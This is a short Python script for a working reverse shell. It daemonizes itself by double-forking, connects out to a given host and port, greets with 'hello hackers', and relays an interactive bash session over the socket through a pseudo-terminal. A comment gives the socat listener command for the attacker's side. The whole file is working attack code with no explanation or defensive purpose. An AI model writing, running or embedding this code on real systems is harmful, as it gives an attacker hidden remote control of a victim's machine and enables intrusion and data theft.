##
##

import socket, os, sys
from threading import Thread

def daemonize():
    pid = os.fork()
    if pid > 0:
        sys.exit(0)   # Exit first parent
    pid = os.fork()
    if pid > 0:
        sys.exit(0)   # Exit second parent


def server(addr, port):
    sc = socket.socket()
    sc.connect((addr, port))
    sc.send(b'hello hackers\n')
    pid, pty_fd = os.forkpty()
    if pid == 0:
        # child with pty as stdin, stdout and stderr
        os.execl("/bin/bash", "bash")
        sys.exit()

    # TODO error handling needs improvement
    def pty_to_sock():
        try:
            while True:
                buf = os.read(pty_fd, 4096)
                sc.send(buf)
        except:
            sys.exit()

    def sock_to_pty():
        try:
            while True:
                buf = sc.recv(4096)
                os.write(pty_fd, buf)
        except:
            sys.exit()

    T1 = Thread(target=pty_to_sock)
    T2 = Thread(target=sock_to_pty)
    T1.start()
    T2.start()
    T1.join()
    T2.join()


## To test it:
daemonize()
server('localhost', 9999)

# Run:
#     socat file:`tty`,raw,echo=0,escape=0x0f tcp-listen:9999

##
##
